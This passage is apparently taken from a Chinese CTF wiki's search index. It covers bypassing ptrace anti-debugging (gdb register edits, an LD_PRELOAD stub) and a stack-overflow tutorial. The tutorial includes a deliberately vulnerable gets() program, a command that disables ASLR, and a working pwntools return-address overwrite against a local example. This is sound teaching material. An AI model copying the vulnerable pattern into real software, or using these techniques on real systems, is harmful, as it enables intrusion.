finish\n00x80483d9  main+29 :   add $0x10,%esp\n0x80483dc    main+32 :  test %eax,%eax\n0x80483de    main+34 :  jns 0x80483fa  main+62 \n0x80483e0    main+36 :  sub $0xc,%esp\n0x80483e3    main+39 :  push $0x80484e8\n0x80483e8    main+44 :  call 0x80482e0\n------------------------------------------------------------------------------\n0x080483d9 in main ()  \u5c06\u51fd\u6570\u8fd4\u56de\u7ed3\u679ceax\u4fee\u6539\u4e3a\u6b63\u786e\u7684\u8fd4\u56de\u7ed3\u679c, \u5c31\u53ef\u4ee5\u4e86  gdb  set $eax=0\ngdb  c\neverything ok\nProgram exited with code 016.\n_______________________________________________________________________________\nNo registers.\ngdb", 
            "title": "\u7ed5\u8fc7\u65b9\u6cd51"
        }, 
        {
            "location": "/reverse/linux/detect-dbg/#2", 
            "text": "\u65b9\u6cd52\u5c31\u662f\u7f16\u5199\u81ea\u5df1\u7684ptrace\u51fd\u6570  \u5982\u524d\u51e0\u7bc7\u6240\u8ff0,  LD_PRELOAD \u73af\u5883\u53d8\u91cf\u53ef\u4ee5\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u6307\u5411\u6211\u4eec\u81ea\u5df1\u7684ptrace\u51fd\u6570.  \u6211\u4eec\u5199\u4e00\u4e2aptrace\u51fd\u6570\u5e76\u751f\u6210\u76ee\u6807\u6587\u4ef6  // -- ptrace.c --  // gcc -shared ptrace.c -o ptrace.so  int   ptrace ( int   i ,   int   j ,   int   k ,   int   l )  { \n     printf (  PTRACE CALLED! \\n );  }   \u6211\u4eec\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u73af\u5883\u53d8\u91cfLD_PRELOAD\u6765\u4f7f\u7528\u6211\u4eec\u81ea\u5df1\u7684ptrace\u51fd\u6570, \u5f53\u7136\u8fd9\u91cc\u662f\u53ef\u4ee5\u5728gdb\u4e2d\u8fdb\u884c\u8bbe\u7f6e  gdb  set environment LD_PRELOAD ./ptrace.so\ngdb  run\nPTRACE CALLED!\nHello World!\nProgram exited with code 015.\ngdb   \u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u65e0\u6cd5\u68c0\u6d4b\u5230\u8c03\u8bd5\u5668\u4e86.    Reference:  Beginners Guide to Basic Linux Anti Anti Debugging Techniques", 
            "title": "\u7ed5\u8fc7\u65b9\u6cd52"
        }, 
        {
            "location": "/pwn/stackoverflow/stack_intro/", 
            "text": "\u6808\u4ecb\u7ecd\n\n\n\u57fa\u672c\u6808\u4ecb\u7ecd\n\n\n\u6808\u662f\u4e00\u79cd\u5178\u578b\u7684\u5148\u8fdb\u540e\u51fa(First in Last Out)\u7684\u6570\u636e\u7ed3\u6784\uff0c\u5176\u64cd\u4f5c\u4e3b\u8981\u6709\u538b\u6808(push)\u4e0e\u51fa\u6808(pop)\u4e24\u79cd\u64cd\u4f5c\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff08\u7ef4\u57fa\u767e\u79d1\uff09\u3002\u4e24\u79cd\u64cd\u4f5c\u90fd\u662f\u64cd\u4f5c\u6808\u9876\uff0c\u5f53\u7136\uff0c\u5b83\u4e5f\u6709\u76f8\u5e94\u7684\u6808\u5e95\u3002\n\n\n\n\n\u5728\u8ba1\u7b97\u673a\u7684\u6c47\u7f16\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u4e5f\u5145\u5206\u5229\u7528\u4e86\u8fd9\u4e00\u6570\u636e\u7ed3\u6784\u3002\u6bcf\u4e2a\u7a0b\u5e8f\u90fd\u6709\u81ea\u5df1\u7684\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\uff0c\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u67d0\u4e00\u90e8\u5206\u5c31\u662f\u8be5\u7a0b\u5e8f\u5bf9\u5e94\u7684\u6808\uff0c\u7528\u4e8e\u4fdd\u5b58\u51fd\u6570\u8c03\u7528\u4fe1\u606f\u548c\u5c40\u90e8\u53d8\u91cf\u3002\u6b64\u5916\uff0c\u5e38\u89c1\u7684\u64cd\u4f5c\u4e5f\u540c\u6837\u662f\u538b\u6808\u4e0e\u51fa\u6808\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u4e0e\u4e00\u822c\u6211\u4eec\u7406\u89e3\u4e0d\u540c\u7684\u662f\uff0c\n\u7a0b\u5e8f\u7684\u6808\u662f\u4ece\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\u7684\u9ad8\u5730\u5740\u5411\u4f4e\u5730\u5740\u589e\u957f\u7684\n\u3002\n\n\n\u51fd\u6570\u8c03\u7528\u6808\n\n\n\u8bf7\u52a1\u5fc5\u4ed4\u7ec6\u770b\u4e00\u4e0b\u4e0b\u9762\u7684\u6587\u7ae0\u6765\u5b66\u4e60\u4e00\u4e0b\u57fa\u672c\u7684\u51fd\u6570\u8c03\u7528\u6808\u3002\n\n\n\n\nC\u8bed\u8a00\u51fd\u6570\u8c03\u7528\u6808(\u4e00)\n\n\nC\u8bed\u8a00\u51fd\u6570\u8c03\u7528\u6808(\u4e8c)\n\n\n\n\n\u8fd9\u91cc\u518d\u7ed9\u51fa\u53e6\u5916\u4e00\u5f20\u5bc4\u5b58\u5668\u7684\u56fe\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c32\u4f4d\u7a0b\u5e8f\u4e0e64\u4f4d\u7a0b\u5e8f\u6709\u4ee5\u4e0b\u7b80\u5355\u7684\u533a\u522b\n\n\n\n\nx86\n\n\n\u51fd\u6570\u53c2\u6570\n\u5728\n\u51fd\u6570\u8fd4\u56de\u5730\u5740\n\u7684\u4e0a\u65b9\n\n\nx64\n\n\nSystem V AMD64 ABI(Linux\u3001FreeBSD\u3001macOS\u7b49\u91c7\u7528)\u4e2d\u524d\u516d\u4e2a\u6574\u578b\u6216\u6307\u9488\u53c2\u6570\u4f9d\u6b21\u4fdd\u5b58\u5728\nRDI, RSI, RDX, RCX, R8\u548cR9\u5bc4\u5b58\u5668\n\u91cc\uff0c\u5982\u679c\u8fd8\u6709\u66f4\u591a\u7684\u53c2\u6570\u7684\u8bdd\u624d\u4f1a\u4fdd\u5b58\u5728\u6808\u4e0a\u3002\n\n\n\u5185\u5b58\u5730\u5740\u4e0d\u80fd\u5927\u4e8e0x00007FFFFFFFFFFF\uff0c\n6\u4e2a\u5b57\u8282\u957f\u5ea6\n\uff0c\u5426\u5219\u4f1a\u629b\u51fa\u5f02\u5e38\u3002\n\n\n\n\n\u53c2\u8003\u9605\u8bfb\n\n\n\n\ncsapp\n\n\nCalling conventions for different C++ compilers and operating systems, Agner Fog", 
            "title": "\u6808\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/stackoverflow/stack_intro/#_1", 
            "text": "", 
            "title": "\u6808\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/stackoverflow/stack_intro/#_2", 
            "text": "\u6808\u662f\u4e00\u79cd\u5178\u578b\u7684\u5148\u8fdb\u540e\u51fa(First in Last Out)\u7684\u6570\u636e\u7ed3\u6784\uff0c\u5176\u64cd\u4f5c\u4e3b\u8981\u6709\u538b\u6808(push)\u4e0e\u51fa\u6808(pop)\u4e24\u79cd\u64cd\u4f5c\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff08\u7ef4\u57fa\u767e\u79d1\uff09\u3002\u4e24\u79cd\u64cd\u4f5c\u90fd\u662f\u64cd\u4f5c\u6808\u9876\uff0c\u5f53\u7136\uff0c\u5b83\u4e5f\u6709\u76f8\u5e94\u7684\u6808\u5e95\u3002   \u5728\u8ba1\u7b97\u673a\u7684\u6c47\u7f16\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u4e5f\u5145\u5206\u5229\u7528\u4e86\u8fd9\u4e00\u6570\u636e\u7ed3\u6784\u3002\u6bcf\u4e2a\u7a0b\u5e8f\u90fd\u6709\u81ea\u5df1\u7684\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\uff0c\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u67d0\u4e00\u90e8\u5206\u5c31\u662f\u8be5\u7a0b\u5e8f\u5bf9\u5e94\u7684\u6808\uff0c\u7528\u4e8e\u4fdd\u5b58\u51fd\u6570\u8c03\u7528\u4fe1\u606f\u548c\u5c40\u90e8\u53d8\u91cf\u3002\u6b64\u5916\uff0c\u5e38\u89c1\u7684\u64cd\u4f5c\u4e5f\u540c\u6837\u662f\u538b\u6808\u4e0e\u51fa\u6808\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u4e0e\u4e00\u822c\u6211\u4eec\u7406\u89e3\u4e0d\u540c\u7684\u662f\uff0c \u7a0b\u5e8f\u7684\u6808\u662f\u4ece\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\u7684\u9ad8\u5730\u5740\u5411\u4f4e\u5730\u5740\u589e\u957f\u7684 \u3002", 
            "title": "\u57fa\u672c\u6808\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/stackoverflow/stack_intro/#_3", 
            "text": "\u8bf7\u52a1\u5fc5\u4ed4\u7ec6\u770b\u4e00\u4e0b\u4e0b\u9762\u7684\u6587\u7ae0\u6765\u5b66\u4e60\u4e00\u4e0b\u57fa\u672c\u7684\u51fd\u6570\u8c03\u7528\u6808\u3002   C\u8bed\u8a00\u51fd\u6570\u8c03\u7528\u6808(\u4e00)  C\u8bed\u8a00\u51fd\u6570\u8c03\u7528\u6808(\u4e8c)   \u8fd9\u91cc\u518d\u7ed9\u51fa\u53e6\u5916\u4e00\u5f20\u5bc4\u5b58\u5668\u7684\u56fe   \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c32\u4f4d\u7a0b\u5e8f\u4e0e64\u4f4d\u7a0b\u5e8f\u6709\u4ee5\u4e0b\u7b80\u5355\u7684\u533a\u522b   x86  \u51fd\u6570\u53c2\u6570 \u5728 \u51fd\u6570\u8fd4\u56de\u5730\u5740 \u7684\u4e0a\u65b9  x64  System V AMD64 ABI(Linux\u3001FreeBSD\u3001macOS\u7b49\u91c7\u7528)\u4e2d\u524d\u516d\u4e2a\u6574\u578b\u6216\u6307\u9488\u53c2\u6570\u4f9d\u6b21\u4fdd\u5b58\u5728 RDI, RSI, RDX, RCX, R8\u548cR9\u5bc4\u5b58\u5668 \u91cc\uff0c\u5982\u679c\u8fd8\u6709\u66f4\u591a\u7684\u53c2\u6570\u7684\u8bdd\u624d\u4f1a\u4fdd\u5b58\u5728\u6808\u4e0a\u3002  \u5185\u5b58\u5730\u5740\u4e0d\u80fd\u5927\u4e8e0x00007FFFFFFFFFFF\uff0c 6\u4e2a\u5b57\u8282\u957f\u5ea6 \uff0c\u5426\u5219\u4f1a\u629b\u51fa\u5f02\u5e38\u3002   \u53c2\u8003\u9605\u8bfb   csapp  Calling conventions for different C++ compilers and operating systems, Agner Fog", 
            "title": "\u51fd\u6570\u8c03\u7528\u6808"
        }, 
        {
            "location": "/pwn/stackoverflow/stackoverflow_basic/", 
            "text": "\u6808\u6ea2\u51fa\u539f\u7406\n\n\n\u4ecb\u7ecd\n\n\n\u6808\u6ea2\u51fa\u6307\u7684\u662f\u7a0b\u5e8f\u5411\u6808\u4e2d\u67d0\u4e2a\u53d8\u91cf\u4e2d\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u8fd9\u4e2a\u53d8\u91cf\u672c\u8eab\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\uff0c\u56e0\u800c\u5bfc\u81f4\u6808\u4e2d\u4e0e\u5176\u76f8\u90bb\u7684\u53d8\u91cf\u7684\u503c\u88ab\u6539\u53d8\u3002\u8fd9\u79cd\u95ee\u9898\u662f\u4e00\u79cd\u7279\u5b9a\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e(\u6bd4\u5982\u8bf4\uff0c\u8fd8\u6709\u5411\u5806\u4e2d\u5199\uff0c\u5411bss\u6bb5\u5199)\u3002\u800c\u5bf9\u4e8e\u9ed1\u5ba2\u6765\u8bf4\uff0c\u6808\u6ea2\u51fa\u6f0f\u6d1e\u8f7b\u5219\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\uff0c\u91cd\u5219\u53ef\u4ee5\u4f7f\u5f97\u653b\u51fb\u8005\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u3002\u6b64\u5916\uff0c\u6211\u4eec\u4e5f\u4e0d\u96be\u53d1\u73b0\uff0c\u53d1\u751f\u6808\u6ea2\u51fa\u7684\u57fa\u672c\u524d\u63d0\u662f\n\n\n\n\n\u7a0b\u5e8f\u5fc5\u987b\u5411\u6808\u4e0a\u5199\u5165\u6570\u636e\u3002\n\n\n\u5199\u5165\u7684\u6570\u636e\u5927\u5c0f\u6ca1\u6709\u88ab\u826f\u597d\u5730\u63a7\u5236\u3002\n\n\n\n\n\u57fa\u672c\u793a\u4f8b\n\n\n\u6700\u5178\u578b\u7684\u6808\u6ea2\u51fa\u5229\u7528\u662f\u8986\u76d6\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u653b\u51fb\u8005\u6240\u63a7\u5236\u7684\u5730\u5740\uff0c\n\u5f53\u7136\u9700\u8981\u786e\u4fdd\u8fd9\u4e2a\u5730\u5740\u7684\u4ee3\u7801\u53ef\u4ee5\u6267\u884c\n\u3002\u4e0b\u9762\uff0c\u6211\u4eec\u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff1a\n\n\n##include \nstdio.h\n\n\n##include \nstring.h\n\n\nvoid\n \nsuccess\n()\n \n{\n \nputs\n(\nYou Hava already controlled it.\n);\n \n}\n\n\nvoid\n \nvulnerable\n()\n \n{\n\n  \nchar\n \ns\n[\n12\n];\n\n  \ngets\n(\ns\n);\n\n  \nputs\n(\ns\n);\n\n  \nreturn\n;\n\n\n}\n\n\nint\n \nmain\n(\nint\n \nargc\n,\n \nchar\n \n**\nargv\n)\n \n{\n\n  \nvulnerable\n();\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u4e3b\u8981\u76ee\u7684\u8bfb\u53d6\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5e76\u5c06\u5176\u8f93\u51fa\u3002\n\u6211\u4eec\u5e0c\u671b\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6267\u884csuccess\u51fd\u6570\u3002\n\n\n\u6211\u4eec\u5229\u7528\u5982\u4e0b\u547d\u4ee4\u5bf9\u9f50\u8fdb\u884c\u7f16\u8bd1\n\n\n\u279c  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example \nstack_example.c: In \nfunction\n \u2018vulnerable\u2019:\nstack_example.c:6:3: warning: implicit declaration of \nfunction\n \u2018gets\u2019 \n[\n-Wimplicit-function-declaration\n]\n\n   gets\n(\ns\n)\n;\n\n   ^\n/tmp/ccPU8rRA.o\uff1a\u5728\u51fd\u6570\u2018vulnerable\u2019\u4e2d\uff1a\nstack_example.c:\n(\n.text+0x27\n)\n: \u8b66\u544a\uff1a the \n`\ngets\n \nfunction\n is dangerous and should not be used.\n\n\n\n\n\u53ef\u4ee5\u770b\u51fagets\u672c\u8eab\u662f\u4e00\u4e2a\u5371\u9669\u51fd\u6570\u3002\u800c\u5b83\u56e0\u4e3a\u5176\u4ece\u4e0d\u68c0\u67e5\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u800c\u662f\u4ee5\u56de\u8f66\u6765\u5224\u65ad\u662f\u5426\u8f93\u5165\u7ed3\u675f\uff0c\u6240\u4ee5\u5f88\u5bb9\u6613\u53ef\u4ee5\u5bfc\u81f4\u6808\u6ea2\u51fa\uff0c\n\n\n\n\n\u5386\u53f2\u4e0a\uff0c\n\u83ab\u91cc\u65af\u8815\u866b\n\u7b2c\u4e00\u79cd\u8815\u866b\u75c5\u6bd2\u5c31\u5229\u7528\u4e86gets\u8fd9\u4e2a\u5371\u9669\u51fd\u6570\u5b9e\u73b0\u4e86\u6808\u6ea2\u51fa\u3002\n\n\n\n\ngcc\u7f16\u8bd1\u6307\u4ee4\u4e2d\uff0c\n-m32\n \u6307\u7684\u662f\u751f\u621032\u4f4d\u7a0b\u5e8f\uff1b \n-fno-stack-protector\n \u6307\u7684\u662f\u4e0d\u5f00\u542f\u5806\u6808\u6ea2\u51fa\u4fdd\u62a4\uff0c\u5373\u4e0d\u751f\u6210canary\u3002\n\u6b64\u5916\uff0c\u4e3a\u4e86\u66f4\u52a0\u65b9\u4fbf\u5730\u4ecb\u7ecd\u6808\u6ea2\u51fa\u7684\u57fa\u672c\u5229\u7528\u65b9\u5f0f\uff0c\u8fd9\u91cc\u8fd8\u9700\u8981\u5173\u95edPIE\uff08Position Independent Executable\uff09\uff0c\u907f\u514d\u52a0\u8f7d\u57fa\u5740\u88ab\u6253\u4e71\u3002\u4e0d\u540cgcc\u7248\u672c\u5bf9\u4e8ePIE\u7684\u9ed8\u8ba4\u914d\u7f6e\u4e0d\u540c\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\ngcc -v\n\u67e5\u770bgcc\u9ed8\u8ba4\u7684\u5f00\u5173\u60c5\u51b5\u3002\u5982\u679c\u542b\u6709\n--enable-default-pie\n\u53c2\u6570\u5219\u4ee3\u8868PIE\u9ed8\u8ba4\u5df2\u5f00\u542f\uff0c\u9700\u8981\u5728\u7f16\u8bd1\u6307\u4ee4\u4e2d\u6dfb\u52a0\u53c2\u6570\n-no-pie\n\u3002\u53ef\u4ee5\u4f7f\u7528checksec\u68c0\u67e5\u7f16\u8bd1\u51fa\u7684\u6587\u4ef6\uff1a\n\n\u279c  stack-example checksec stack_example\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n\n\n\n\n\n\u63d0\u5230\u7f16\u8bd1\u65f6\u7684PIE\u4fdd\u62a4\uff0cLinux\u5e73\u53f0\u4e0b\u8fd8\u6709\u5730\u5740\u7a7a\u95f4\u5206\u5e03\u968f\u673a\u5316\uff08ASLR\uff09\u7684\u673a\u5236\u3002\u7b80\u5355\u6765\u8bf4\u5373\u4f7f\u53ef\u6267\u884c\u6587\u4ef6\u5f00\u542f\u4e86PIE\u4fdd\u62a4\uff0c\u8fd8\u9700\u8981\u7cfb\u7edf\u5f00\u542fASLR\u624d\u4f1a\u771f\u6b63\u6253\u4e71\u57fa\u5740\uff0c\u5426\u5219\u7a0b\u5e8f\u8fd0\u884c\u65f6\u4f9d\u65e7\u4f1a\u5728\u52a0\u8f7d\u4e00\u4e2a\u56fa\u5b9a\u7684\u57fa\u5740\u4e0a\uff08\u4e0d\u8fc7\u548cNo PIE\u65f6\u57fa\u5740\u4e0d\u540c\uff09\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\n/proc/sys/kernel/randomize_va_space\n\u6765\u63a7\u5236ASLR\u542f\u52a8\u4e0e\u5426\uff08\u4f7f\u7528\necho 0 \n /proc/sys/kernel/randomize_va_space\n\u5173\u95edLinux\u7cfb\u7edf\u7684ASLR\uff0c0\u66ff\u6362\u4e3a1\u62162\u5219\u4e3a\u5f00\u542f\uff09\u3002\u4e3a\u4e86\u964d\u4f4e\u540e\u7eed\u6559\u7a0b\u590d\u6742\u5ea6\uff0c\u6211\u4eec\u9009\u62e9\u5ffd\u7565ASLR\u7684\u72b6\u6001\uff0c\u76f4\u63a5\u5728\u7f16\u8bd1\u65f6\u5173\u95edPIE\u3002\u5f53\u7136\u8bfb\u8005\u4e5f\u53ef\u4ee5\u5c1d\u8bd5ASLR\u3001PIE\u5f00\u5173\u7684\u4e0d\u540c\u7ec4\u5408\uff0c\u914d\u5408IDA\u53ca\u5176\u52a8\u6001\u8c03\u8bd5\u529f\u80fd\u89c2\u5bdf\u7a0b\u5e8f\u5730\u5740\u53d8\u5316\u60c5\u51b5\uff08\u5728ASLR\u5173\u95ed\u3001PIE\u5f00\u542f\u65f6\u4e5f\u53ef\u4ee5\u653b\u51fb\u6210\u529f\uff09\u3002\n\n\n\n\n\u786e\u8ba4\u6808\u6ea2\u51fa\u548cPIE\u4fdd\u62a4\u5173\u95ed\u540e\uff0c\u6211\u4eec\u5229\u7528IDA\u6765\u53cd\u7f16\u8bd1\u4e00\u4e0b\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u5e76\u67e5\u770bvulnerable\u51fd\u6570 \u3002\u53ef\u4ee5\u770b\u5230\n\n\nint\n \nvulnerable\n()\n\n\n{\n\n  \nchar\n \ns\n;\n \n// [sp+4h] [bp-14h]@1\n\n\n  \ngets\n(\ns\n);\n\n  \nreturn\n \nputs\n(\ns\n);\n\n\n}\n\n\n\n\n\n\u8be5\u5b57\u7b26\u4e32\u8ddd\u79bbebp\u7684\u957f\u5ea6\u4e3a0x14\uff0c\u90a3\u4e48\u76f8\u5e94\u7684\u6808\u7ed3\u6784\u4e3a\n\n\n                                           +-----------------+\n                                           |     retaddr     |\n                                           +-----------------+\n                                           |     saved ebp   |\n                                    ebp---\n+-----------------+\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                              s,ebp-0x14--\n+-----------------+\n\n\n\n\n\u5e76\u4e14\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7IDA\u83b7\u5f97success\u7684\u5730\u5740\uff0c\u5176\u5730\u5740\u4e3a0x0804846B\u3002\n\n\n.text:\n0804843\nB\n \nsuccess\n         \nproc\n \nnear\n\n\n.text:\n0804843\nB\n                 \npush\n    \nebp\n\n\n.text:\n0804843\nC\n                 \nmov\n     \nebp\n,\n \nesp\n\n\n.text:\n0804843\nE\n                 \nsub\n     \nesp\n,\n \n8\n\n\n.text:\n08048441\n                 \nsub\n     \nesp\n,\n \n0\nCh\n\n\n.text:\n08048444\n                 \npush\n    \noffset\n \ns\n        \n; \nYou Hava already controlled it.\n\n\n.text\n:\n08048449\n                 \ncall\n    \n_puts\n\n\n.text:\n0804844\nE\n                 \nadd\n     \nesp\n,\n \n10\nh\n\n\n.text:\n08048451\n                 \nnop\n\n\n.text:\n08048452\n                 \nleave\n\n\n.text:\n08048453\n                 \nretn\n\n\n.text:\n08048453\n \nsuccess\n         \nendp\n\n\n\n\n\n\u90a3\u4e48\u5982\u679c\u6211\u4eec\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u4e3a\n\n\n0x14*\na\n+\nbbbb\n+success_addr\n\n\n\n\n\u90a3\u4e48\uff0c\u7531\u4e8egets\u4f1a\u8bfb\u5230\u56de\u8f66\u624d\u7b97\u7ed3\u675f\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6\u6240\u6709\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u4e14\u5c06saved ebp\u8986\u76d6\u4e3abbbb\uff0c\u5c06retaddr\u8986\u76d6\u4e3asuccess_addr\uff0c\u5373\uff0c\u6b64\u65f6\u7684\u6808\u7ed3\u6784\u4e3a\n\n\n                                           +-----------------+\n                                           |    0x0804843B   |\n                                           +-----------------+\n                                           |       bbbb      |\n                                    ebp---\n+-----------------+\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                              s,ebp-0x14--\n+-----------------+\n\n\n\n\n\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u5728\u8ba1\u7b97\u673a\u5185\u5b58\u4e2d\uff0c\u5bf9\u5e94\u7684\u6bcf\u4e2a\u503c\u90fd\u662f\u6309\u7167\u5b57\u8282\u5b58\u50a8\u7684\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\u90fd\u662f\u91c7\u7528\u5c0f\u7aef\u5b58\u50a8\uff0c\u53730x0804843B\u7684\u5b58\u50a8\u662f\u5982\u4e0b\u7ed3\u6784\n\n\n\\x3b\\x84\\x04\\x08\n\n\n\n\n\u4f46\u662f\uff0c\u6211\u4eec\u53c8\u4e0d\u80fd\u76f4\u63a5\u5728\u7ec8\u7aef\u5c06\u8fd9\u4e9b\u5b57\u7b26\u7ed9\u8f93\u5165\u8fdb\u53bb\uff0c\u5728\u7ec8\u7aef\u8f93\u5165\u7684\u65f6\u5019\\\uff0cx\u7b49\u4e5f\u7b97\u4e00\u4e2a\u5355\u72ec\u7684\u5b57\u7b26\u3002\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u5c06\\x3b\u4e4b\u7c7b\u7684\u4f5c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u8f93\u5165\u8fdb\u53bb\u3002\u90a3\u4e48\u6b64\u65f6\u6211\u4eec\u5c31\u9700\u8981\u4f7f\u7528\u4e00\u6ce2pwntools\u4e86(\u5173\u4e8e\u5982\u4f55\u5b89\u88c5\u4ee5\u53ca\u57fa\u672c\u7528\u6cd5\uff0c\u8bf7\u81ea\u884cgithub)\uff0c\u8fd9\u91cc\u5229\u7528pwntools\u7684\u4ee3\u7801\u5982\u4e0b\uff1a\n\n\n##coding=utf8\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n## \u6784\u9020\u4e0e\u7a0b\u5e8f\u4ea4\u4e92\u7684\u5bf9\u8c61\n\n\nsh\n \n=\n \nprocess\n(\n./stack_example\n)\n\n\nsuccess_addr\n \n=\n \n0x0804843b\n\n\n## \u6784\u9020payload\n\n\npayload\n \n=\n \na\n \n*\n \n0x14\n \n+\n \nbbbb\n \n+\n \np32\n(\nsuccess_addr\n)\n\n\nprint\n \np32\n(\nsuccess_addr\n)\n\n\n## \u5411\u7a0b\u5e8f\u53d1\u9001\u5b57\u7b26\u4e32\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\n## \u5c06\u4ee3\u7801\u4ea4\u4e92\u8f6c\u6362\u4e3a\u624b\u5de5\u4ea4\u4e92\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u6267\u884c\u4e00\u6ce2\u4ee3\u7801\uff0c\u53ef\u4ee5\u5f97\u5230\n\n\n\u279c  stack-example python exp.py\n\n[\n+\n]\n Starting \nlocal\n process \n./stack_example\n: pid \n61936\n\n\n;\n\\x\n84\n\\x\n0\n\n\n[\n*\n]\n Switching to interactive mode\naaaaaaaaaaaaaaaaaaaabbbb\n;\n\\x\n84\n\\x\n0\n\nYou Hava already controlled it.\n\n[\n*\n]\n Got EOF \nwhile\n reading in interactive\n$ \n\n[\n*\n]\n Process \n./stack_example\n stopped with \nexit\n code -11 \n(\nSIGSEGV\n)\n \n(\npid \n61936\n)\n\n\n[\n*\n]\n Got EOF \nwhile\n sending in interactive\n\n\n\n\n\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u786e\u5b9e\u5df2\u7ecf\u6267\u884csuccess\u51fd\u6570\u3002\n\n\n\u5c0f\u603b\u7ed3\n\n\n\u4e0a\u9762\u7684\u793a\u4f8b\u5176\u5b9e\u4e5f\u5c55\u793a\u4e86\u6808\u6ea2\u51fa\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u6b65\u9aa4:\n\n\n\u5bfb\u627e\u5371\u9669\u51fd\u6570\n\n\n\u901a\u8fc7\u5bfb\u627e\u5371\u9669\u51fd\u6570\uff0c\u6211\u4eec\u5feb\u901f\u786e\u5b9a\u7a0b\u5e8f\u662f\u5426\u53ef\u80fd\u6709\u6808\u6ea2\u51fa\uff0c\u4ee5\u53ca\u6709\u7684\u8bdd\uff0c\u6808\u6ea2\u51fa\u7684\u4f4d\u7f6e\u5728\u54ea\u91cc\u3002\n\n\n\u5e38\u89c1\u7684\u5371\u9669\u51fd\u6570\u5982\u4e0b\n\n\n\n\n\u8f93\u5165\n\n\ngets\uff0c\u76f4\u63a5\u8bfb\u53d6\u4e00\u884c\uff0c\u5ffd\u7565'\\x00'\n\n\nscanf\n\n\nvscanf\n\n\n\n\n\n\n\u8f93\u51fa\n\n\nsprintf\n\n\n\n\n\n\n\u5b57\u7b26\u4e32\n\n\nstrcpy\uff0c\u5b57\u7b26\u4e32\u590d\u5236\uff0c\u9047\u5230'\\x00'\u505c\u6b62\n\n\nstrcat\uff0c\u5b57\u7b26\u4e32\u62fc\u63a5\uff0c\u9047\u5230'\\x00'\u505c\u6b62\n\n\nbcopy\n\n\n\n\n\n\n\n\n\u786e\u5b9a\u586b\u5145\u957f\u5ea6\n\n\n\u8fd9\u4e00\u90e8\u5206\u4e3b\u8981\u662f\u8ba1\u7b97\n\u6211\u4eec\u6240\u8981\u64cd\u4f5c\u7684\u5730\u5740\u4e0e\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\u7684\u8ddd\u79bb\n\u3002\u5e38\u89c1\u7684\u64cd\u4f5c\u65b9\u6cd5\u5c31\u662f\u6253\u5f00IDA\uff0c\u6839\u636e\u5176\u7ed9\u5b9a\u7684\u5730\u5740\u8ba1\u7b97\u504f\u79fb\u3002\u4e00\u822c\u53d8\u91cf\u4f1a\u6709\u4ee5\u4e0b\u51e0\u79cd\u7d22\u5f15\u6a21\u5f0f\n\n\n\n\n\u76f8\u5bf9\u4e8e\u6808\u57fa\u5730\u5740\u7684\u7684\u7d22\u5f15\n\n\n\u76f8\u5bf9\u5e94\u6808\u9876\u6307\u9488\u7684\u7d22\u5f15\n\n\n\u76f4\u63a5\u5730\u5740\u7d22\u5f15\n\n\n\n\n\u5176\u4e2d\u76f8\u5bf9\u4e8e\u